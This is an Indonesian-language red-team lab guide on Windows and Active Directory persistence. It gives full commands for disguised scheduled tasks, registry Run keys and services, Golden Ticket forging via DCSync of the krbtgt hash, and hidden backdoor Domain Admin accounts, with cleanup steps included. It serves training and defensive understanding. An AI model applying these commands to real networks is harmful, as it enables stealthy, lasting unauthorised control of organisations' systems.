# 🔒 Skenario Serangan: Persistence

## Gambaran Umum

Persistence adalah teknik mempertahankan akses ke sistem yang sudah dikompromikan agar attacker bisa kembali kapan saja, bahkan setelah mesin di-reboot atau password diubah. Ini adalah fase terakhir dari attack chain.

**PENTING:** Di lab ini, latihan persistence berfungsi untuk memahami teknik yang digunakan oleh threat actor nyata. Di dunia nyata, menemukan dan menghapus persistence mechanism adalah tanggung jawab blue team saat incident response.

---

## Skenario 1: Scheduled Task Persistence

**Tujuan:** Membuat scheduled task yang berjalan otomatis secara berkala untuk mempertahankan akses.

**MITRE ATT&CK:** T1053.005 — Scheduled Task/Job: Scheduled Task

**Penjelasan:** Scheduled task di Windows bisa dikonfigurasi untuk menjalankan program secara otomatis berdasarkan jadwal (misalnya setiap kali boot, setiap jam, dll.). Attacker bisa membuat task yang menjalankan reverse shell atau beacon secara berkala.

### Dari Kali (Remote)

```bash
# Menggunakan Impacket atexec
impacket-atexec corp.local/s.admin:P@ssw0rd123@192.168.56.10 \
    "cmd.exe /c whoami > C:\temp\persistence_test.txt"

# Menggunakan CrackMapExec
crackmapexec smb 192.168.56.10 -u "s.admin" -p "P@ssw0rd123" \
    -x 'schtasks /create /tn "SystemHealthCheck" /tr "cmd.exe /c whoami > C:\temp\health.txt" /sc onlogon /ru SYSTEM /f'
```

### Dari Target Windows (jika sudah punya shell)

```powershell
# Buat scheduled task yang berjalan saat logon
schtasks /create /tn "WindowsUpdateCheck" `
    /tr "cmd.exe /c whoami > C:\temp\persist_check.txt" `
    /sc onlogon /ru SYSTEM /f

# Buat scheduled task yang berjalan setiap jam
schtasks /create /tn "SystemDiagnostics" `
    /tr "powershell.exe -ep bypass -c 'whoami | Out-File C:\temp\diag.txt'" `
    /sc hourly /ru SYSTEM /f

# Verifikasi task terbuat
schtasks /query /tn "WindowsUpdateCheck"
schtasks /query /tn "SystemDiagnostics"

# Cleanup (hapus task setelah latihan)
schtasks /delete /tn "WindowsUpdateCheck" /f
schtasks /delete /tn "SystemDiagnostics" /f
```

### Mengapa Efektif?

- Task berjalan sebagai SYSTEM (privilege tertinggi)
- Bertahan setelah reboot
- Nama task bisa disamarkan menyerupai task Windows yang sah
- Blue team perlu memeriksa semua scheduled task satu per satu

---

## Skenario 2: Registry Run Keys Persistence

**Tujuan:** Menambahkan entri registry yang menjalankan program saat user login.

**MITRE ATT&CK:** T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys

**Penjelasan:** Windows memiliki beberapa registry key yang otomatis menjalankan program saat user login atau saat sistem boot. Attacker bisa memasukkan entri untuk menjalankan payload mereka.

### Dari Target Windows

```powershell
# ---- Per-User Persistence (HKCU) ----
# Berjalan setiap kali user tertentu login

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" `
    /v "SecurityUpdate" `
    /t REG_SZ `
    /d "cmd.exe /c whoami > C:\temp\user_persist.txt" `
    /f

# ---- System-Wide Persistence (HKLM) - butuh admin ----
# Berjalan untuk semua user saat login

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" `
    /v "WindowsDefenderUpdate" `
    /t REG_SZ `
    /d "cmd.exe /c whoami > C:\temp\system_persist.txt" `
    /f

# Verifikasi
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

# Cleanup
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefenderUpdate" /f
```

### Dari Kali (Remote)

```bash
# Menggunakan CrackMapExec
crackmapexec smb 192.168.56.10 -u "s.admin" -p "P@ssw0rd123" \
    -x 'reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysMonitor" /t REG_SZ /d "cmd.exe /c echo persistent > C:\temp\reg_persist.txt" /f'
```

### Registry Keys yang Umum Digunakan

| Registry Path      | Scope     | Kapan Dijalankan                 |
|--------------------|-----------|----------------------------------|
| `HKCU\...\Run`     | Per-user  | User login                       |
| `HKLM\...\Run`     | All users | Any user login                   |   
| `HKCU\...\RunOnce` | Per-user  | Sekali saat login (lalu dihapus) |
| `HKLM\...\RunOnce` | All users | Sekali saat boot                 |

---

## Skenario 3: Windows Service Persistence

**Tujuan:** Membuat Windows service yang berjalan otomatis saat boot.

**MITRE ATT&CK:** T1543.003 — Create or Modify System Process: Windows Service

**Penjelasan:** Windows service berjalan di background dan biasanya start otomatis saat boot. Attacker bisa membuat service baru yang menjalankan payload mereka, menyamar sebagai service Windows yang sah.

### Dari Target Windows

```powershell
# Buat service baru
sc.exe create "WindowsTelemetryService" `
    binpath= "cmd.exe /c whoami > C:\temp\svc_persist.txt" `
    start= auto `
    DisplayName= "Windows Telemetry Collection Service"

# Set deskripsi agar terlihat legitimate
sc.exe description "WindowsTelemetryService" "Collects and sends usage data to improve Windows experience."

# Verifikasi
sc.exe query "WindowsTelemetryService"
Get-Service "WindowsTelemetryService"

# Cleanup
sc.exe delete "WindowsTelemetryService"
```

### Dari Kali (Remote)

```bash
# Menggunakan Impacket services
impacket-services corp.local/s.admin:P@ssw0rd123@192.168.56.10 create \
    -name "WinDiagSvc" \
    -display "Windows Diagnostics Service" \
    -path "cmd.exe /c whoami > C:\temp\remote_svc.txt"

# Start service
impacket-services corp.local/s.admin:P@ssw0rd123@192.168.56.10 start -name "WinDiagSvc"

# Cleanup
impacket-services corp.local/s.admin:P@ssw0rd123@192.168.56.10 delete -name "WinDiagSvc"
```

---

## Skenario 4: Golden Ticket (Advanced Persistence)

**Tujuan:** Membuat Kerberos TGT palsu yang memberikan akses Domain Admin tanpa batas waktu.

**MITRE ATT&CK:** T1558.001 — Steal or Forge Kerberos Tickets: Golden Ticket

**Penjelasan:** Golden Ticket dibuat menggunakan hash dari akun `krbtgt` (akun khusus yang menandatangani semua TGT di domain). Dengan hash ini, attacker bisa membuat TGT palsu untuk user apa pun — bahkan user yang tidak ada — dengan privilege apa pun, berlaku selama bertahun-tahun.

**Prasyarat:** Hash NTLM akun `krbtgt` (didapat dari DCSync).

```bash
# Step 1: Dapatkan hash krbtgt via DCSync
impacket-secretsdump corp.local/s.admin:P@ssw0rd123@192.168.56.10 -just-dc-user krbtgt

# Catat:
# - krbtgt NTLM hash
# - Domain SID (contoh: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX)
```

### Menggunakan Mimikatz (dari Windows)

```powershell
# Buat Golden Ticket
mimikatz.exe "kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:<NTLM_HASH> /ptt" "exit"

# Verifikasi ticket ter-inject
klist

# Akses DC
dir \\dc1.corp.local\C$
```

### Menggunakan Impacket (dari Kali)

```bash
# Buat Golden Ticket
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
    -domain corp.local FakeAdmin

# Set ticket
export KRB5CCNAME=FakeAdmin.ccache

# Gunakan ticket
impacket-psexec -k -no-pass corp.local/FakeAdmin@dc1.corp.local
impacket-wmiexec -k -no-pass corp.local/FakeAdmin@dc1.corp.local
```

### Mengapa Golden Ticket Sangat Berbahaya?

- Berlaku selama **10 tahun** secara default
- User yang dimasukkan tidak perlu ada di AD
- Tidak terpengaruh oleh perubahan password user
- Satu-satunya cara invalidate adalah mereset password `krbtgt` **dua kali** (karena AD menyimpan current dan previous hash)
- Tidak tergantung pada DC manapun untuk validasi (offline forging)

---

## Skenario 5: Backdoor Domain Admin Account

**Tujuan:** Membuat akun domain admin tersembunyi sebagai backdoor.

**MITRE ATT&CK:** T1136.002 — Create Account: Domain Account

```bash
# Dari Kali (dengan akses DA)
# Buat user baru
impacket-addcomputer corp.local/s.admin:P@ssw0rd123 -computer-name "YOURPC$" -computer-pass "Backdoor2024!"

# Atau buat user biasa via CrackMapExec
crackmapexec smb 192.168.56.10 -u "s.admin" -p "P@ssw0rd123" \
    -x 'net user svc_monitor BackdoorPass2024! /add /domain && net group "Domain Admins" svc_monitor /add /domain'
```

Dari target Windows:

```powershell
# Buat akun backdoor yang terlihat seperti service account
New-ADUser -Name "Monitoring Service" -SamAccountName "svc_monitor" `
    -UserPrincipalName "svc_monitor@corp.local" `
    -Path "OU=Service Accounts,OU=IT,DC=corp,DC=local" `
    -AccountPassword (ConvertTo-SecureString "BackdoorPass2024!" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true `
    -Description "System Monitoring Service Account"

# Tambahkan ke Domain Admins
Add-ADGroupMember -Identity "Domain Admins" -Members "svc_monitor"

# Cleanup
Remove-ADUser -Identity "svc_monitor" -Confirm:$false
```

---

## Cleanup Semua Persistence

**PENTING:** Setelah selesai latihan, bersihkan semua persistence mechanism:

```powershell
# Hapus scheduled tasks
schtasks /delete /tn "WindowsUpdateCheck" /f
schtasks /delete /tn "SystemDiagnostics" /f

# Hapus registry keys
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefenderUpdate" /f

# Hapus services
sc.exe delete "WindowsTelemetryService"

# Hapus backdoor accounts
Remove-ADUser -Identity "svc_monitor" -Confirm:$false

# Cek ulang
schtasks /query /fo LIST
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
Get-Service | Where-Object {$_.Status -eq "Stopped" -and $_.StartType -eq "Automatic"}
Get-ADGroupMember "Domain Admins"
```
